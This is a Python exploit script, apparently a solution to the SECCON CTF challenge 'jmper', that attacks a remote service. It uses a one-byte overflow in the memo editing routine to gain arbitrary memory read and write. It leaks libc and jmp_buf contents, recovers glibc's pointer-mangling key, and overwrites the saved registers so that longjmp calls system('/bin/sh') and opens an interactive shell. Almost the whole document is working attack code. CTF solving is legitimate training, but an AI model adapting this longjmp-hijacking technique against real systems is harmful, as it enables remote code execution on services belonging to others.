import pwnbox,struct
#p = pwnbox.pipe.ProcessPipe("./jmper")
p = pwnbox.pipe.SocketPipe("jmper.pwn.seccon.jp",5656)
pack  = lambda x: struct.pack("<Q",x)
unpack  = lambda x: struct.unpack("<Q",x)[0]


def ROL(data, shift, size=32):
    shift %= size
    remains = data >> (size - shift)
    body = (data << shift) - (remains << size )
    return (body + remains)
     
 
def ROR(data, shift, size=32):
    shift %= size
    body = data >> shift
    remains = (data << (size - shift)) - (body << size)
    return (body + remains)

def end():
  return p.read_until("Bye :)\n")

def add():
  p.write("1\n")
  end()


def name(idx,name):
  p.write("2\n")
  p.read_until(":")
  p.write("%d\n"%idx)
  p.read_until(":")
  p.write(name)
  end()

def memo(idx,name):
  p.write("3\n")
  p.read_until(":")
  p.write("%d\n"%idx)
  p.read_until(":")
  p.write(name)
  end()


def show_memo(idx,n=8):
  p.write("4\n")
  p.read_until(":")
  p.write("%d\n"%idx)
  data= end()
  return data.split("1. Add student.")[0][:8].ljust(n,"\x00")

  


add()
add()
memo(0,"A"*0x20+"\x78")
memo(1,"B"*0x21)
def leak(adr):
  data = pack(adr).ljust(0x21,"\x00")
  name(0,data)
  return unpack(show_memo(1))
def write(adr,v):
  data = pack(adr).ljust(0x21,"\x00")
  name(0,data)
  name(1,v.ljust(0x21,"\x00"))

puts = leak(0x601fa0)
jmper = leak(0x602038)
a1 = leak(jmper+8)
a2 = leak(jmper+0x30)
a3 = leak(jmper+0x38)

key = ( ROR(a3,0x11,64) ^ 0x400c31)
print hex(puts)
print hex(jmper)
print hex(a3)
libc = puts -0x000000000006f5d0
system = libc +0x0000000000045380

libc = puts - 0x000000000006fd60
system = libc + 0x0000000000046590

pay = ""
pay += "/bin/sh\x00" # rbx
pay += pack(a1) # rbp
pay += "C"*8 # r12 
pay += "D"*8 # r13
write(jmper,pay)
rip= 0x41414141
rip = system
pay = ""
pay += "E"*8 # r14
pay += "F"*8 # r15
pay += pack(a2) # rsp
pay += pack(ROL((key^rip),0x11,64)) # rip
write(jmper+0x20,pay)

pay = ""
pay += "I"*8 # r14
pay += "J"*8 # r15
pay += "K"*8 # r12 
pay += "L"*8 # r13
#write(jmper+0x20*2,pay)
for i in range(28):
  add()
p.interact()
